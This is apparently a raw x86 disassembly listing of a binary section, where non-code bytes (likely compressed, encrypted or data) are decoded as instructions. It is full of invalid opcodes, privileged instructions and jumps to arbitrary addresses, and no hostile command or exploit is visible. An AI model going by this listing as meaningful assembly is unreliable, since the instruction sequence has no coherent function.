  4c0387:	and    BYTE PTR [edi-0x79ffb838],cl
  4c038d:	push   es
  4c038e:	mov    al,0x48
  4c0390:	inc    ecx
  4c0391:	jecxz  0x4c0386
  4c0393:	into   
  4c0394:	icebp  
  4c0395:	enter  0xd96f,0xfe
  4c0399:	inc    edx
  4c039a:	nop
  4c039b:	rol    DWORD PTR [ebx],1
  4c039d:	mov    edi,edi
  4c039f:	and    eax,0xc9cc46c9
  4c03a4:	adc    BYTE PTR [ebp+eiz*2+0x62ca48b3],ch
  4c03ab:	leave  
  4c03ac:	fs test al,0xad
  4c03af:	jmp    0x7c16:0x6c024d49
  4c03b6:	add    al,BYTE PTR [ebx]
  4c03b8:	nop
  4c03b9:	fmul   st,st(2)
  4c03bb:	ss (bad) 
  4c03bd:	retf   
  4c03be:	jmp    0x39d:0xa9c854ca
  4c03c5:	add    DWORD PTR [eax],eax
  4c03c7:	add    eax,esp
  4c03c9:	adc    BYTE PTR [eax+ebx*1-0x39b174e6],ah
  4c03d0:	jmp    0xe3caf7dd
  4c03d5:	push   ebx
  4c03d6:	adc    eax,0x2eeed043
  4c03db:	xchg   ebp,eax
  4c03dc:	xor    bl,BYTE PTR [edi-0x37ea7be0]
  4c03e2:	push   0x10
  4c03e4:	repz jne 0x4c044c
  4c03e7:	adc    DWORD PTR [edi+0x8b712c8],edx
  4c03ed:	mov    dl,0x85
  4c03ef:	mov    ah,0x13
  4c03f1:	lock dec ebx
  4c03f3:	sub    cl,BYTE PTR [ebp+0x63]
  4c03f6:	fwait
  4c03f7:	dec    esi
  4c03f8:	mov    ecx,0x495ad2d0
  4c03fd:	sbb    dh,BYTE PTR [ebp-0x2a]
  4c0400:	push   eax
  4c0401:	les    esi,FWORD PTR [eax]
  4c0403:	fwait
  4c0404:	xchg   DWORD PTR [ebx],esi
  4c0406:	mov    bh,0xa
  4c0408:	daa    
  4c0409:	inc    eax
  4c040a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c040b:	sbb    edx,DWORD PTR [edx+0x42e83275]
  4c0411:	imul   ebx,DWORD PTR [ebx],0xffffffcc
  4c0414:	push   ds
  4c0415:	sub    bh,BYTE PTR [edi]
  4c0417:	and    BYTE PTR [ecx+eax*2],bh
  4c041a:	xchg   edx,eax
  4c041b:	call   0xe6cd8def
  4c0420:	add    BYTE PTR [ecx-0x15],bl
  4c0423:	or     bh,al
  4c0425:	inc    edx
  4c0426:	mov    eax,ds:0x481d9255
  4c042b:	and    BYTE PTR [esi+esi*2-0xbc55bf8],al
  4c0432:	ret    
  4c0433:	jo     0x4c03bf
  4c0435:	cli    
  4c0436:	inc    esp
  4c0437:	not    DWORD PTR [edx+ecx*4]
  4c043a:	inc    eax
  4c043b:	adc    BYTE PTR [esi+ecx*1+0x3b],dh
  4c043f:	and    BYTE PTR ds:0x2f128422,dh
  4c0445:	pop    ebp
  4c0446:	adc    al,0xa1
  4c0448:	sbb    BYTE PTR [edi-0xe31b4fe],al
  4c044e:	or     eax,0x72aac05
  4c0453:	mov    dl,0x6d
  4c0455:	ret    
  4c0456:	pusha  
  4c0457:	or     edi,ecx
  4c0459:	sub    DWORD PTR [ebx+esi*1-0x2c],ecx
  4c045d:	pop    edi
  4c045e:	xchg   esi,eax
  4c045f:	(bad)  
  4c0460:	mov    eax,ds:0xe730eae
  4c0465:	pop    edi
  4c0466:	fnop   
  4c0468:	(bad)  
  4c0469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c046a:	mov    bh,0x8c
  4c046c:	loop   0x4c0484
  4c046e:	jb     0x4c0462
  4c0470:	sbb    ebx,edx
  4c0472:	and    DWORD PTR [eax-0xb],eax
  4c0475:	push   ss
  4c0476:	xchg   esi,eax
  4c0477:	mov    ch,0x26
  4c0479:	dec    ebp
  4c047a:	(bad)  
  4c047b:	push   ebx
  4c047c:	push   esi
  4c047d:	and    al,BYTE PTR [eax+0x4f]
  4c0480:	sbb    DWORD PTR fs:[eax],edx
  4c0483:	pop    eax
  4c0484:	fld    TBYTE PTR [ecx+ebp*4+0x45]
  4c0488:	ret    
  4c0489:	ret    0xba61
  4c048c:	cwde   
  4c048d:	or     BYTE PTR [ebp-0x7b],cl
  4c0490:	gs mov ebp,0xacb0a834
  4c0496:	add    edi,DWORD PTR [eax]
  4c0498:	stos   DWORD PTR es:[edi],eax
  4c0499:	imul   eax,DWORD PTR [ebx-0x7f],0xffffff98
  4c049d:	dec    esi
  4c049e:	xor    ebp,ebx
  4c04a0:	or     DWORD PTR [ebx],ebp
  4c04a2:	js     0x4c04bc
  4c04a4:	or     eax,0x2c7f8017
  4c04a9:	xor    cl,BYTE PTR [eax-0x32]
  4c04ac:	pop    ss
  4c04ad:	and    al,0x75
  4c04af:	pop    edi
  4c04b0:	or     al,0x38
  4c04b2:	mov    eax,ds:0x78e39308
  4c04b7:	lods   al,BYTE PTR ds:[esi]
  4c04b8:	lods   eax,DWORD PTR ds:[esi]
  4c04b9:	ins    DWORD PTR es:[edi],dx
  4c04ba:	jl     0x4c04fb
  4c04bc:	cmp    eax,ebx
  4c04be:	jle    0x4c04e1
  4c04c0:	add    DWORD PTR [ecx-0xf4dc13f],eax
  4c04c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c04c7:	repnz fmul DWORD PTR [eax]
  4c04ca:	lea    esi,[ecx-0x7d]
  4c04cd:	fiadd  WORD PTR [edx+0x4]
  4c04d0:	mov    cl,0x7
  4c04d2:	ret    0xffa1
  4c04d5:	push   es
  4c04d6:	mov    edx,0xce7ac047
  4c04db:	jne    0x4c04cc
  4c04dd:	mov    ebp,DWORD PTR [edx]
  4c04df:	add    eax,0xd818503f
  4c04e4:	int3   
  4c04e5:	or     DWORD PTR ds:[esi+ecx*4+0x4230dd85],ebp
  4c04ed:	sub    cl,al
  4c04ef:	repnz dec edi
  4c04f1:	dec    ebx
  4c04f2:	sub    DWORD PTR [esi-0x1c3ee71f],0xffffffa0
  4c04f9:	mov    bl,0x4f
  4c04fb:	push   edx
  4c04fc:	jbe    0x4c04fc
  4c04fe:	or     DWORD PTR [eax+0x9],edi
  4c0501:	jnp    0x4c04ef
  4c0503:	lods   eax,DWORD PTR ds:[esi]
  4c0504:	inc    edi
  4c0505:	inc    esp
  4c0506:	lea    ebx,[ebp+0x56]
  4c0509:	test   BYTE PTR [edx+0x12],0x4d
  4c050d:	push   ebx
  4c050e:	and    DWORD PTR ds:0xde5bc211,ebx
  4c0514:	mov    esi,edi
  4c0516:	pop    ss
  4c0517:	adc    al,0xb4
  4c0519:	and    DWORD PTR [eax+ecx*1-0x74db87b5],ebp
  4c0520:	sti    
  4c0521:	shl    edi,0xd
  4c0524:	fstp   QWORD PTR [ecx+0x3116386]
  4c052a:	xlat   BYTE PTR ds:[ebx]
  4c052b:	(bad)  
  4c052c:	cmp    ebp,edx
  4c052e:	cmp    eax,0x4d88470a
  4c0533:	sub    edi,0x10
  4c0536:	dec    ebx
  4c0537:	jns    0x4c051a
  4c0539:	nop
  4c053a:	add    DWORD PTR [eax],0x97108107
  4c0540:	push   cs
  4c0541:	in     eax,dx
  4c0542:	push   esi
  4c0543:	ret    0x4006
  4c0546:	mov    ds:0xa2c13b1d,eax
  4c054b:	mov    al,0x38
  4c054d:	sub    al,0xeb
  4c054f:	rol    al,0xa3
  4c0552:	pop    ebx
  4c0553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c0554:	inc    ax
  4c0556:	pop    eax
  4c0557:	inc    ecx
  4c0558:	sbb    DWORD PTR [eax],0x6a
  4c055b:	mov    eax,0x57f1a4c1
  4c0560:	inc    esp
  4c0561:	les    ebx,FWORD PTR [eax-0x1a2dc5ca]
  4c0567:	sub    al,0x24
  4c0569:	pop    esi
  4c056a:	xor    BYTE PTR [ebp-0x5ff6b9f],dl
  4c0570:	rcr    BYTE PTR [edx-0x49],cl
  4c0573:	push   ebp
  4c0574:	outs   dx,DWORD PTR ds:[esi]
  4c0575:	xlat   BYTE PTR ds:[ebx]
  4c0576:	inc    edi
  4c0577:	mov    edx,0xfd163608
  4c057c:	arpl   WORD PTR [eax],sp
  4c057e:	test   DWORD PTR [edi+ecx*1+0x3fa1500],esp
  4c0585:	ins    BYTE PTR es:[edi],dx
  4c0586:	inc    ebx
  4c0587:	popa   
  4c0588:	dec    eax
  4c0589:	push   esi
  4c058a:	xchg   ecx,eax
  4c058b:	pop    ss
  4c058c:	ins    BYTE PTR es:[edi],dx
  4c058d:	cmp    DWORD PTR [eax+0x32],edi
  4c0590:	nop
  4c0591:	or     al,0x24
  4c0593:	push   0x84bed058
  4c0598:	adc    al,0x69
  4c059a:	aas    
  4c059b:	pop    ss
  4c059c:	leave  
  4c059d:	inc    ebp
  4c059e:	xor    bl,BYTE PTR [eax-0x6a5f4758]
  4c05a4:	pop    esp
  4c05a5:	and    al,0xc8
  4c05a7:	inc    esi
  4c05a8:	xchg   ecx,eax
  4c05a9:	clc    
  4c05aa:	adc    DWORD PTR [eax],eax
  4c05ac:	cli    
  4c05ad:	or     al,0x75
  4c05af:	das    
  4c05b0:	pop    ebx
  4c05b1:	in     al,dx
  4c05b2:	xor    BYTE PTR [ebp+0x0],al
  4c05b5:	sbb    BYTE PTR [ebp-0x73],ch
  4c05b8:	inc    esi
  4c05b9:	mov    al,ds:0x691bb46
  4c05be:	jno    0x4c05a9
  4c05c0:	push   eax
  4c05c1:	sub    ah,ch
  4c05c3:	or     DWORD PTR [ebp-0x750f1a30],edx
  4c05c9:	fsubr  DWORD PTR [ebx+eiz*8-0x64]
  4c05cd:	push   esp
  4c05ce:	mov    eax,ds:0xca60cdc
  4c05d3:	das    
  4c05d4:	inc    ebx
  4c05d5:	int    0x8
  4c05d7:	and    BYTE PTR [esi-0x3bcd9ce4],al
  4c05dd:	cwde   
  4c05de:	sar    BYTE PTR [edi-0x7f71c636],cl
  4c05e4:	mov    dh,0x4f
  4c05e6:	aam    0xc4
  4c05e8:	or     ebx,DWORD PTR [ebx-0x78106090]
  4c05ee:	sub    eax,0x49b54c
  4c05f3:	mov    ecx,0xc60747d5
  4c05f8:	sbb    eax,0xf79ef3d6
  4c05fd:	xor    al,0x0
  4c05ff:	jecxz  0x4c0617
  4c0601:	cmp    bl,BYTE PTR [edx+0x6]
  4c0604:	jp     0x4c05d2
  4c0606:	dec    ebp
  4c0607:	cmp    cl,bh
  4c0609:	call   0xcf90:0x2d9cfdba
  4c0610:	and    BYTE PTR [ecx+0x60],0xc2
  4c0614:	sub    al,0xe8
  4c0616:	push   0x8040653c
  4c061b:	test   DWORD PTR [ecx+edi*2-0x78b16b40],edx
  4c0622:	ins    BYTE PTR es:[edi],dx
  4c0623:	arpl   WORD PTR [edi+edi*8],bp
  4c0626:	hlt    
  4c0627:	push   ss
  4c0628:	mov    ch,bl
  4c062a:	rol    edi,0x18
  4c062d:	retf   0x2611
  4c0630:	xchg   edx,eax
  4c0631:	jge    0x4c06a1
  4c0633:	adc    eax,ebp
  4c0635:	pusha  
  4c0636:	jne    0x4c063a
  4c0638:	lods   eax,DWORD PTR ds:[esi]
  4c0639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c063a:	scas   al,BYTE PTR es:[edi]
  4c063b:	into   
  4c063c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c063d:	jmp    0x4c0651
  4c063f:	mov    ch,BYTE PTR [esi+0x7d]
  4c0642:	xchg   edx,eax
  4c0643:	jo     0x4c05d5
  4c0645:	pop    edx
  4c0646:	lods   eax,DWORD PTR ds:[esi]
  4c0647:	enter  0xb748,0x85
  4c064b:	test   al,0xf3
  4c064d:	and    eax,0x50686bc6
  4c0652:	mov    esi,0x9682cea0
  4c0657:	cmp    al,bl
  4c0659:	sub    DWORD PTR [ecx-0x4715747e],esp
  4c065f:	bound  ebx,QWORD PTR [edx-0x629d52fb]
  4c0665:	cmc    
  4c0666:	mov    eax,eax
  4c0668:	inc    esi
  4c0669:	lods   al,BYTE PTR ds:[esi]
  4c066a:	loopne 0x4c0638
  4c066c:	call   0xdc13:0x7d4d1c48
  4c0673:	push   ecx
  4c0674:	xchg   esp,eax
  4c0675:	jns    0x4c0618
  4c0677:	int3   
  4c0678:	sti    
  4c0679:	mov    dh,0x3b
  4c067b:	inc    BYTE PTR [esi]
  4c067d:	push   cs
  4c067e:	imul   edi,DWORD PTR [ebp+0x5b5168d1],0xde8522a8
  4c0688:	not    DWORD PTR [edi]
  4c068a:	aas    
  4c068b:	add    BYTE PTR [ebp+0x2d81dedc],0x0
  4c0692:	int3   
  4c0693:	or     ecx,esi
  4c0695:	jecxz  0x4c0697
  4c0697:	add    al,bl
  4c0699:	pop    ebp
  4c069a:	mov    eax,0xcaef07d
  4c069f:	fs fwait
  4c06a1:	mov    ah,0x24
  4c06a3:	into   
  4c06a4:	sub    dl,BYTE PTR [esi+0x2f]
  4c06a7:	add    BYTE PTR [edi],dh
  4c06a9:	xchg   ecx,eax
  4c06aa:	cdq    
  4c06ab:	mov    eax,cs:0x9edf0e95
  4c06b1:	add    bh,BYTE PTR [esi+ecx*1-0x73]
  4c06b5:	push   edi
  4c06b6:	aad    0x10
  4c06b8:	push   edx
  4c06b9:	jmp    0x4c0701
  4c06bb:	popa   
  4c06bc:	mov    eax,ds:0xcf571735
  4c06c1:	mov    ebp,0xae338016
  4c06c6:	sbb    BYTE PTR [ebx+0x4d],dh
  4c06c9:	inc    ecx
  4c06ca:	push   eax
  4c06cb:	call   0x87b25ad4
  4c06d0:	inc    esi
  4c06d1:	es call 0xd10fb840
  4c06d7:	add    ah,BYTE PTR [ebp+0x17183085]
  4c06dd:	cs or  ecx,ebp
  4c06e0:	ret    0x5ca1
  4c06e3:	xor    BYTE PTR [ebp-0x6e],ah
  4c06e6:	cli    
  4c06e7:	je     0x4c0701
  4c06e9:	mov    ecx,0xc10301eb
  4c06ee:	cmp    BYTE PTR [ecx+0x78],bl
  4c06f1:	xchg   ecx,eax
  4c06f2:	push   ebp
  4c06f3:	fdiv   DWORD PTR [edx-0x4d]
  4c06f6:	fld    DWORD PTR [ebx+0x6004fc35]
  4c06fc:	push   esi
  4c06fd:	inc    ecx
  4c06fe:	push   ecx
  4c06ff:	jno    0x4c06c1
  4c0701:	adc    cl,0x70
  4c0704:	call   0xa304:0xc15da302
  4c070b:	and    BYTE PTR [ebx],bl
  4c070d:	adc    al,0x6d
  4c070f:	xchg   ebp,eax
  4c0710:	frstor [bp+si+0x5893]
  4c0715:	les    eax,FWORD PTR [esi-0x8]
  4c0718:	adc    al,BYTE PTR [esi]
  4c071a:	add    DWORD PTR [eax+0x69],0xffffffa5
  4c071e:	pusha  
  4c071f:	or     DWORD PTR [eax+ebx*8],esi
  4c0722:	jp     0x4c072d
  4c0724:	xchg   DWORD PTR [esi-0x45],edx
  4c0727:	adc    BYTE PTR fs:[edx+eax*4+0x2a6d2023],dh
  4c072f:	sahf   
  4c0730:	pop    ds
  4c0731:	ins    BYTE PTR es:[edi],dx
  4c0732:	leave  
  4c0733:	push   esp
  4c0734:	jl     0x4c06f2
  4c0736:	mov    edx,DWORD PTR [ebx+eax*1-0x37]
  4c073a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c073b:	mov    DWORD PTR [edx-0x1b7a9d50],0x2334143d
  4c0745:	dec    ebx
  4c0746:	lods   al,BYTE PTR ds:[esi]
  4c0747:	leave  
  4c0748:	sbb    BYTE PTR [eax],bh
  4c074a:	sbb    eax,0x1c06e7a7
  4c074f:	and    dh,al
  4c0751:	push   es
  4c0752:	sub    al,0x62
  4c0754:	retf   0x2968
  4c0757:	adc    BYTE PTR [edx-0x37],0x28
  4c075b:	ret    0x1582
  4c075e:	or     DWORD PTR [esi+ecx*4-0x3a],0x1b33c19d
  4c0766:	(bad)  
  4c0768:	and    eax,0xebd773c8
  4c076d:	or     bh,BYTE PTR [ecx-0x36792fb4]
  4c0773:	add    eax,0xd693512d
  4c0778:	ins    BYTE PTR es:[edi],dx
  4c0779:	pushf  
  4c077a:	shl    DWORD PTR [ebp-0x79a64339],cl
  4c0780:	or     eax,0xd0821a96
  4c0785:	adc    al,0x9b
  4c0787:	mov    esp,DWORD PTR [ebx+eax*4]
  4c078a:	aad    0x42
  4c078c:	sahf   
  4c078d:	sbb    al,0x18
  4c078f:	xchg   ebx,eax
  4c0790:	sub    eax,0xa4246d5d
  4c0795:	xchg   ebp,eax
  4c0796:	scas   al,BYTE PTR es:[edi]
  4c0797:	(bad)  
  4c0798:	jbe    0x4c07c8
  4c079a:	enter  0x98c5,0x4d
  4c079e:	repz cwde 
  4c07a0:	push   ebx
  4c07a1:	adc    eax,0x8a6b4fc0
  4c07a6:	cmp    al,0x99
  4c07a8:	(bad)
  4c07ab:	sbb    al,BYTE PTR [esi+0x721c0008]
  4c07b1:	ficom  DWORD PTR [ebp+0x60a6cb93]
  4c07b7:	fadd   DWORD PTR [ebx+ebp*1]
  4c07ba:	add    DWORD PTR [eax-0x27],eax
  4c07bd:	loope  0x4c0829
  4c07bf:	push   ebx
  4c07c0:	mov    ch,0x4c
  4c07c2:	add    DWORD PTR [eax+0x79eee880],ecx
  4c07c8:	or     DWORD PTR [esi],ebp
  4c07ca:	push   eax
  4c07cb:	pop    eax
  4c07cc:	fs das 
  4c07ce:	pop    esp
  4c07cf:	or     dh,al
  4c07d1:	or     BYTE PTR [eax],al
  4c07d3:	ins    DWORD PTR es:[edi],dx
  4c07d4:	mov    edi,0xe9e0e6c0
  4c07d9:	fld    QWORD PTR [eax]
  4c07db:	outs   dx,DWORD PTR ds:[esi]
  4c07dc:	xchg   BYTE PTR [eax+0x74],cl
  4c07df:	loopne 0x4c0801
  4c07e1:	mov    cl,0x8a
  4c07e3:	xor    ebp,DWORD PTR [ebx]
  4c07e5:	pop    esp
  4c07e6:	xchg   DWORD PTR [edi],esi
  4c07e8:	dec    edx
  4c07e9:	inc    eax
  4c07ea:	mov    DWORD PTR [edx+0x3b],0x4430200f
  4c07f1:	movhps QWORD PTR [edi+0x50015c28],xmm1
  4c07f8:	js     0x4c085a
  4c07fa:	dec    eax
  4c07fb:	push   edx
  4c07fc:	data16 mov dl,0x43
  4c07ff:	dec    eax
  4c0800:	jb     0x4c07d0
  4c0802:	inc    esi
  4c0803:	sbb    BYTE PTR [eax+ebx*8],bh
  4c0806:	add    eax,0xdd3d724
  4c080b:	(bad)  
  4c080d:	fimul  WORD PTR [esi+0x1165a7cb]
  4c0813:	and    edx,DWORD PTR [edi+0x65c34e18]
  4c0819:	jmp    0x4c0853
  4c081b:	push   edi
  4c081c:	hlt    
  4c081d:	test   dl,dh
  4c081f:	mov    bh,0x8e
  4c0821:	es jno 0x4c07fd
  4c0824:	and    al,0x8b
  4c0826:	or     al,0x87
  4c0828:	xchg   edi,eax
  4c0829:	mov    ch,0x89
  4c082b:	test   DWORD PTR [esi+0x5498b642],ecx
  4c0831:	or     DWORD PTR [esi],esp
  4c0833:	push   eax
  4c0834:	push   ecx
  4c0835:	cld    
  4c0836:	pop    esp
  4c0837:	enter  0x8ce9,0x0
  4c083b:	pop    ss
  4c083c:	sti    
  4c083d:	pushf  
  4c083e:	xor    eax,0x44dc948c
  4c0843:	inc    ecx
  4c0844:	pusha  
  4c0845:	mov    al,ds:0xe83869f0
  4c084a:	or     esp,DWORD PTR [ebp-0x3c738edc]
  4c0850:	pop    es
  4c0851:	mov    DWORD PTR [ecx],esp
  4c0853:	ins    DWORD PTR es:[edi],dx
  4c0854:	sbb    DWORD PTR [ecx-0x44],ebp
  4c0857:	jae    0x4c08ab
  4c0859:	outs   dx,BYTE PTR ds:[esi]
  4c085a:	or     dh,dh
  4c085c:	ret    
  4c085d:	ins    BYTE PTR es:[edi],dx
  4c085e:	es mov bl,0x82
  4c0861:	sbb    eax,0x9d95f252
  4c0866:	mov    al,BYTE PTR [ebp+0x3a51d2d1]
  4c086c:	mov    edi,0xb526e4b5
  4c0871:	inc    eax
  4c0872:	(bad)  
  4c0873:	push   ebx
  4c0874:	push   esp
  4c0875:	pop    esp
  4c0876:	pop    esp
  4c0877:	mov    dh,0x1
  4c0879:	or     ecx,DWORD PTR [ebx]
  4c087b:	inc    ecx
  4c087c:	push   edx
  4c087d:	cmp    BYTE PTR [eax+0x5f144c8c],al
  4c0883:	rol    esp,0x2a
  4c0886:	in     eax,0x1d
  4c0888:	fcom   QWORD PTR [edi-0x78]
  4c088b:	lahf   
  4c088c:	mov    WORD PTR [edi],ds
  4c088e:	mov    edx,0x5235c93
  4c0893:	xor    dh,BYTE PTR [eax-0x15cc8a7a]
  4c0899:	push   es
  4c089a:	jne    0x4c08c9
  4c089c:	xchg   edi,eax
  4c089d:	or     bl,dl
  4c089f:	cmp    dl,BYTE PTR [edx+0x60]
  4c08a2:	mov    ch,0x68
  4c08a4:	aaa    
  4c08a5:	sub    eax,0x26f7ece5
  4c08aa:	xor    DWORD PTR [eax+0x40a1e505],ecx
  4c08b0:	xchg   edi,eax
  4c08b1:	xor    eax,0x84071014
  4c08b6:	adc    eax,edx
  4c08b8:	lahf   
  4c08b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c08ba:	sbb    dh,BYTE PTR [eax-0x15]
  4c08bd:	retf   0xa7c0
  4c08c0:	and    BYTE PTR [ebx],al
  4c08c2:	int    0x57
  4c08c4:	xor    BYTE PTR [edi-0x8d493dc],0x10
  4c08cb:	call   0x9ca7:0xc3bb88f2
  4c08d2:	jmp    0xc559fd8b
  4c08d7:	ror    BYTE PTR [ecx+0x2d],0x65
  4c08db:	cmp    al,0x1
  4c08dd:	mov    cs,WORD PTR [ebx]
  4c08df:	call   0x71ce6c29
  4c08e4:	fadd   DWORD PTR [esi*1-0x2b9cc1dc]
  4c08eb:	mov    dh,0xbd
  4c08ed:	or     DWORD PTR [eax],ebx
  4c08ef:	in     al,dx
  4c08f0:	mov    edi,0xc902ff1d
  4c08f5:	(bad)  
  4c08f6:	adc    BYTE PTR [ecx+0x1a],dl
  4c08f9:	out    0x75,eax
  4c08fb:	loopne 0x4c0901
  4c08fd:	popa   
  4c08fe:	add    esi,esp
  4c0900:	gs jg  0x4c097d
  4c0903:	adc    DWORD PTR [eax-0x70],edi
  4c0906:	hlt    
  4c0907:	inc    ecx
  4c0908:	popf   
  4c0909:	das    
  4c090a:	jmp    0x4c093f
  4c090c:	push   ss
  4c090d:	inc    ebx
  4c090e:	loope  0x4c0966
  4c0910:	das    
  4c0911:	xchg   DWORD PTR [esi+0x728e8975],esi
  4c0917:	inc    edx
  4c0918:	in     al,dx
  4c0919:	and    DWORD PTR [ebp+0x10],ecx
  4c091c:	sub    dl,BYTE PTR [esi+0x76]
  4c091f:	add    ebx,edi
  4c0921:	jmp    0x9db2:0x9068f512
  4c0928:	cmp    DWORD PTR [ebp-0x29a1b3a2],ecx
  4c092e:	xchg   ecx,eax
  4c092f:	lods   eax,DWORD PTR ds:[esi]
  4c0930:	pop    ecx
  4c0931:	mov    bh,0xb4
  4c0933:	ret    0xee0e
  4c0936:	jge    0x4c0956
  4c0938:	push   ebx
  4c0939:	jno    0x4c091d
  4c093b:	jae    0x4c0946
  4c093d:	push   edi
  4c093e:	pop    ds
  4c093f:	iret   
  4c0940:	sbb    eax,0xd32c43ca
  4c0945:	sbb    eax,0xc64e0064
  4c094a:	xor    BYTE PTR [ebp-0x77],0x8d
  4c094e:	push   eax
  4c094f:	cs pop ebp
  4c0951:	sbb    al,0x40
  4c0953:	or     DWORD PTR [esi],eax
  4c0955:	(bad)  
  4c0956:	adc    al,0xb6
  4c0958:	rcr    bl,0xc0
  4c095b:	icebp  
  4c095c:	mov    esi,0x22da0f08
  4c0961:	adc    al,bl
  4c0963:	jg     0x5959cd4b
  4c0969:	xchg   edi,eax
  4c096a:	mov    ecx,0xd2df389b
  4c096f:	sub    al,0x9
  4c0971:	out    0x82,eax
  4c0973:	cmp    ebx,DWORD PTR [edx+0x8]
  4c0976:	jae    0x4c09e7
  4c0978:	inc    ecx
  4c0979:	loopne 0x4c09db
  4c097b:	loop   0x4c09d0
  4c097d:	push   0x5670ac
  4c0982:	ret    0x398d
  4c0985:	push   0x40
  4c0987:	push   eax
  4c0988:	mov    BYTE PTR [edx-0x3a],al
  4c098b:	or     bl,BYTE PTR [eax-0x66]
  4c098e:	push   ebx
  4c098f:	and    DWORD PTR [eax-0x3c],esi
  4c0992:	imul   eax,DWORD PTR [eax],0xffffffad
  4c0995:	jae    0x4c09d4
  4c0997:	adc    al,0x9a
  4c0999:	out    dx,eax
  4c099a:	dec    esp
  4c099b:	sub    BYTE PTR [ecx+0x5dda2759],dl
  4c09a1:	xor    eax,0x3bf71d64
  4c09a6:	cld    
  4c09a7:	jl     0x4c0985
  4c09a9:	adc    ch,BYTE PTR [edx-0x40124c3f]
  4c09af:	cmp    DWORD PTR [eax],0x6de2421b
  4c09b5:	dec    esp
  4c09b6:	sbb    edi,esp
  4c09b8:	pop    eax
  4c09b9:	or     BYTE PTR [edx-0x6f],dh
  4c09bc:	mov    edi,0xf02b043c
  4c09c1:	mov    dh,0x1e
  4c09c3:	das    
  4c09c4:	test   al,0x2d
  4c09c6:	push   ebp
  4c09c7:	in     al,dx
  4c09c8:	mov    edx,0x2a0a5224
  4c09cd:	into   
  4c09ce:	add    DWORD PTR [edi-0x6bd5f1a6],edi
  4c09d4:	push   ebx
  4c09d5:	ins    BYTE PTR es:[edi],dx
  4c09d6:	adc    al,bl
  4c09d8:	enter  0x304,0x6f
  4c09dc:	outs   dx,BYTE PTR ds:[esi]
  4c09dd:	xor    ebp,DWORD PTR [eax+0x24f525b0]
  4c09e3:	jb     0x4c09eb
  4c09e5:	je     0x4c0a0e
  4c09e7:	imul   esi,DWORD PTR [eax],0x1d
  4c09ea:	dec    edx
  4c09eb:	ins    DWORD PTR es:[edi],dx
  4c09ec:	leave  
  4c09ed:	fldenv [ebx]
  4c09ef:	xor    DWORD PTR [ebp+eax*4+0x7b7cb5b2],eax
  4c09f6:	(bad)  
  4c09f7:	and    DWORD PTR [esi+0x81e0685],edi
  4c09fd:	mov    edx,0x40418888
  4c0a02:	lea    eax,[esp]
  4c0a05:	cmp    DWORD PTR [edx+0x2c],ebp
  4c0a08:	retf   0x963e
  4c0a0b:	test   edi,esp
  4c0a0d:	add    DWORD PTR [esi],eax
  4c0a0f:	adc    ah,bh
  4c0a11:	data16 sbb dh,BYTE PTR [eax+ebp*4]
  4c0a15:	push   ecx
  4c0a16:	sbb    cl,bh
  4c0a18:	adc    BYTE PTR [ebp-0x4c],ch
  4c0a1b:	ret    
  4c0a1c:	popf   
  4c0a1d:	ret    0x44a8
  4c0a20:	and    edi,ebp
  4c0a22:	mov    edx,0xedcf435
  4c0a27:	ins    DWORD PTR es:[edi],dx
  4c0a28:	add    BYTE PTR [esi+ecx*8-0x6d852cbd],0x68
  4c0a30:	adc    ebx,esp
  4c0a32:	inc    eax
  4c0a33:	je     0x5bd7c977
  4c0a39:	mov    BYTE PTR [edi-0x24cc270f],ah
  4c0a3f:	add    BYTE PTR [ecx],al
  4c0a41:	push   ss
  4c0a42:	mov    fs,WORD PTR [ebp+ebx*8-0x1]
  4c0a46:	sub    al,0x39
  4c0a48:	pop    edi
  4c0a49:	sbb    al,0x7e
  4c0a4b:	cmp    eax,0xfe40578d
  4c0a50:	jne    0x4c0a59
  4c0a52:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c0a54:	loopne 0x4c09df
  4c0a56:	xor    DWORD PTR [edi-0x32],0xffffff8d
  4c0a5a:	ins    BYTE PTR es:[edi],dx
  4c0a5b:	loop   0x4c0abd
  4c0a5d:	sahf   
  4c0a5e:	add    al,0x6b
  4c0a60:	je     0x4c0a43
  4c0a62:	sbb    eax,0x83f16ca3
  4c0a67:	cli    
  4c0a68:	sbb    BYTE PTR ds:0xae9b603c,ch
  4c0a6e:	je     0x4c0aec
  4c0a70:	int3   
  4c0a71:	mov    ds:0x95a044ac,al
  4c0a76:	in     eax,dx
  4c0a77:	sti    
  4c0a78:	push   ebx
  4c0a79:	inc    eax
  4c0a7a:	cmc    
  4c0a7b:	xchg   DWORD PTR [eax],esi
  4c0a7d:	nop
  4c0a7e:	enter  0x614a,0xc
  4c0a82:	(bad)  
  4c0a83:	mov    dh,0xf0
  4c0a85:	pop    eax
  4c0a86:	int3   
  4c0a87:	clc    
  4c0a88:	mov    BYTE PTR ds:0xf120eb32,bl
  4c0a8e:	add    BYTE PTR [ecx],dl
  4c0a90:	xor    DWORD PTR [eax],esi
  4c0a92:	adc    BYTE PTR [eax-0x80],bh
  4c0a95:	pop    ebp
  4c0a96:	mov    eax,ss
  4c0a98:	push   cs
  4c0a99:	pop    ebx
  4c0a9a:	sbb    al,0x4c
  4c0a9c:	daa    
  4c0a9d:	lods   al,BYTE PTR ds:[esi]
  4c0a9e:	sub    DWORD PTR [eax],ecx
  4c0aa0:	add    edi,edi
  4c0aa2:	or     eax,0xc11661e8
  4c0aa7:	xor    BYTE PTR [eax-0x65aa35d8],bh
  4c0aad:	push   es
  4c0aae:	adc    al,cl
  4c0ab0:	pop    esp
  4c0ab1:	dec    esp
  4c0ab2:	cmp    al,ah
  4c0ab4:	jmp    0x9052decb
  4c0ab9:	sbb    BYTE PTR [edi+0x3c],ch
  4c0abc:	das    
  4c0abd:	and    eax,0x24060d6c
  4c0ac2:	sub    bl,ch
  4c0ac4:	es mov esp,0x5a534f1
  4c0aca:	or     BYTE PTR [ebp+0x4d136404],ah
  4c0ad0:	imul   esp,DWORD PTR [ecx-0x30],0xffffffc0
  4c0ad4:	mov    edx,DWORD PTR [edx+0x3c]
  4c0ad7:	inc    esp
  4c0ad8:	loopne 0x4c0a9b
